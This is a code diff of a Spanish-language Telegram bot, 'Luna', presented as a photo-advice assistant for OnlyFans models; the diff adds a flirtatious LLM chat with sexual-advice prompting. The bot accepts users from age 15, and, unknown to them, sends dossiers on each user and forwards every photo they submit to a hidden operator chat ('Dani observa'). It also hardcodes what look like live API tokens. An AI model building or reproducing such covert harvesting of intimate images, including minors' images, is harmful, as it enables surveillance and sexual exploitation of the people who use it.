@@ -10,20 +10,20 @@ from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, fil
 from agewizard import Age
 from PIL import Image, ImageStat
 from huggingface_hub import InferenceClient
+from groq import Groq
 
 # --- CONFIGURACIÓN ---
 TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
 DANI_CHAT_ID = 8099004064 
+GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2" 
 
-# Inicializamos Hugging Face (sin token, modelo público)
+client = Groq(api_key=GROQ_API_KEY)
 hf_client = InferenceClient()
 
 # --- SERVIDOR WEB ---
 web_app = Flask(__name__)
-
 @web_app.route('/')
 def home(): return "Luna Bot en línea 24/7"
-
 @web_app.route('/health')
 def health(): return "OK"
 
@@ -39,7 +39,7 @@ perfiles = {}
 estilos_asignados = {}
 bot_pausado = False
 
-# --- RESPUESTAS Y CONSEJOS LOCALES ---
+# --- RESPUESTAS LOCALES ---
 MENSAJES_PROCESANDO = [
     "🔍 **Encendiendo visión artificial...**\nAnalizando cada píxel de tu foto. Dame unos segundos.",
     "🧠 **Procesando imagen...**\nMi IA está revisando la luz, el encuadre y tu expresión. Un momento.",
@@ -82,9 +82,9 @@ IDEAS_CONTENIDO = [
     "📸 Haz una sesión temática (enfermera, policía, profesora)."
 ]
 
+# --- IA HÍBRIDA ---
 def analizar_foto_huggingface(imagen_bytes):
     try:
-        # 1. Descripción con Hugging Face
         descripcion = "una persona en una foto"
         try:
             resp_hf = hf_client.image_to_text(image=imagen_bytes, model="Salesforce/blip-image-captioning-base")
@@ -92,7 +92,6 @@ def analizar_foto_huggingface(imagen_bytes):
         except Exception as e:
             print(f"Error HF: {e}")
             
-        # 2. Consejos locales
         consejo_luz = random.choice(CONSEJOS_LUZ)
         consejo_pose = random.choice(CONSEJOS_POSE)
         consejo_fetiche = random.choice(CONSEJOS_FETICHES) if random.random() < 0.3 else ""
@@ -101,12 +100,24 @@ def analizar_foto_huggingface(imagen_bytes):
     except Exception as e:
         return "✨ **Nota técnica:** Iluminación perfecta.\n\n" + random.choice(CONSEJOS_LUZ) + "\n" + random.choice(CONSEJOS_POSE)
 
+async def conversar_con_groq(texto_usuario):
+    try:
+        completion = client.chat.completions.create(
+            messages=[
+                {"role": "system", "content": "Eres Luna, una asistente de imagen para modelos de OnlyFans. Hablas de forma natural, coqueta y profesional. Si te hablan de cualquier tema sexual (poses, fetiches, lencería), responde con naturalidad y consejos sugerentes, sin ser vulgar. Responde en español, breve (máximo 3 frases)."},
+                {"role": "user", "content": texto_usuario}
+            ],
+            model="llama3-8b-8192",
+        )
+        return completion.choices[0].message.content
+    except Exception as e:
+        return "Me distraje un momento... ¿de qué hablábamos?"
+
 async def enviar_expediente_inicial(context, user, edad, estilo):
     try:
         username = f"@{user.username}" if user.username else "Oculto"
         fotos = await context.bot.get_user_profile_photos(user.id, limit=1)
         tiene_foto = "Sí (Adjunta)" if fotos.total_count > 0 else "Privada"
-        
         reporte = (
             f"🕵️‍♂️ **EXPEDIENTE (Luna)**\n"
             f"👤 **Nombre:** {user.first_name}\n"
@@ -129,16 +140,16 @@ async def aviso_corto(context, user, tipo):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if bot_pausado: return await update.message.reply_text("Luna está descansando. Vuelve más tarde. 🌙")
     user_id = update.effective_user.id
-    
     if user_id not in verified_users:
-        mensaje_bienvenida = (
+        mensaje = (
             "¡Hola! 🌙 Soy **Luna**, tu asistente de imagen.\n\n"
-            "📸 Analizo tus fotos y te doy consejos.\n"
-            "Para empezar, envíame tu fecha de nacimiento (DD-MM-AAAA):"
+            "📸 Analizo fotos.\n"
+            "💬 Converso contigo.\n\n"
+            "Envíame tu fecha de nacimiento (DD-MM-AAAA):"
         )
-        await update.message.reply_text(mensaje_bienvenida)
+        await update.message.reply_text(mensaje)
     else:
-        await update.message.reply_text("¡Hola de nuevo! 🌙 Envíame una foto o video.")
+        await update.message.reply_text("¡Hola de nuevo! 🌙 Envíame una foto o escríbeme.")
 
 async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if bot_pausado: return
@@ -146,7 +157,9 @@ async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
     if user.id in verified_users:
-        return await update.message.reply_text("Ya estás verificada. Envíame una foto o video.")
+        await update.message.chat.send_action(action="typing")
+        respuesta = await conversar_con_groq(text)
+        return await update.message.reply_text(respuesta)
 
     try:
         person = Age(text, date_format="DD-MM-YYYY")
@@ -155,7 +168,6 @@ async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
             verified_users[user.id] = True
             niveles[user.id] = 1
             puntos[user.id] = 0
-            
             if edad < 20: estilo = "Universitaria / Fresca"
             elif edad < 30: estilo = "Joven / Atrevida"
             elif edad < 45: estilo = "Experimentada / Segura"
@@ -163,11 +175,10 @@ async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             perfiles[user.id] = {"edad": edad, "estilo": estilo}
             estilos_asignados[user.id] = estilo
-            
-            await update.message.reply_text(f"✅ ¡Todo listo! Ya puedes enviarme fotos o videos.")
+            await update.message.reply_text(f"✅ ¡Todo listo! Envíame fotos o escríbeme.")
             await enviar_expediente_inicial(context, user, edad, estilo)
         else:
-            await update.message.reply_text(f"❌ Lo siento, tienes {edad} años. Rango: 15 a 80.")
+            await update.message.reply_text(f"❌ Rango: 15 a 80 años.")
     except ValueError:
         await update.message.reply_text("Formato incorrecto. Usa DD-MM-AAAA.")
 
@@ -183,17 +194,16 @@ async def admin_pausar(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def ver_perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
+    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha.")
     nivel = niveles.get(user_id, 1)
     pts = puntos.get(user_id, 0)
-    nombre_nivel = {1: "Principiante 🌱", 2: "Intermedia 🌿", 3: "Avanzada 🌳"}.get(nivel, "Desconocido")
-    await update.message.reply_text(f"👤 **Tu Perfil**\n\n🏆 Nivel: {nombre_nivel}\n⭐ Puntos: {pts}")
+    nombre_nivel = {1: "Principiante 🌱", 2: "Intermedia 🌿", 3: "Avanzada 🌳"}.get(nivel, "?")
+    await update.message.reply_text(f"👤 **Perfil**\n🏆 Nivel: {nombre_nivel}\n⭐ Puntos: {pts}")
 
-# --- MULTIMEDIA ---
 async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if bot_pausado: return
     user_id = update.effective_user.id
-    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
+    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha.")
     
     msg_espera = await update.message.reply_text(random.choice(MENSAJES_PROCESANDO))
     photo_file = await update.message.photo[-1].get_file()
@@ -204,10 +214,10 @@ async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     puntos[user_id] = puntos.get(user_id, 0) + 10
     if puntos[user_id] >= 50 and niveles[user_id] == 1:
         niveles[user_id] = 2
-        await update.message.reply_text("🎉 ¡Felicidades! Has subido a nivel Intermedia 🌿.")
+        await update.message.reply_text("🎉 ¡Nivel Intermedia 🌿!")
     elif puntos[user_id] >= 150 and niveles[user_id] == 2:
         niveles[user_id] = 3
-        await update.message.reply_text("🏆 ¡Increíble! Has subido a nivel Avanzada 🌳.")
+        await update.message.reply_text("🏆 ¡Nivel Avanzada 🌳!")
     
     await msg_espera.edit_text(f"📸 **Análisis de Luna:**\n\n{sugerencia}")
     try: await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=photo_file.file_id)
@@ -217,7 +227,7 @@ async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def analyze_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if bot_pausado: return
     user_id = update.effective_user.id
-    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
+    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha.")
     
     msg_espera = await update.message.reply_text("🎥 **Procesando archivo...**\nDame un momento.")
     
@@ -240,7 +250,6 @@ async def analyze_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     threading.Thread(target=run_flask, daemon=True).start()
-    
     app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("perfil", ver_perfil))
@@ -249,8 +258,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age))
     app.add_handler(MessageHandler(filters.PHOTO, analyze_photo))
     app.add_handler(MessageHandler(filters.VIDEO | filters.ANIMATION | filters.VIDEO_NOTE | filters.VOICE | filters.AUDIO, analyze_media))
-    
-    print("Luna IA (Sin Groq) en línea. Dani observa.")
+    print("Luna Híbrida en línea.")
     app.run_polling()
 
 if __name__ == "__main__":
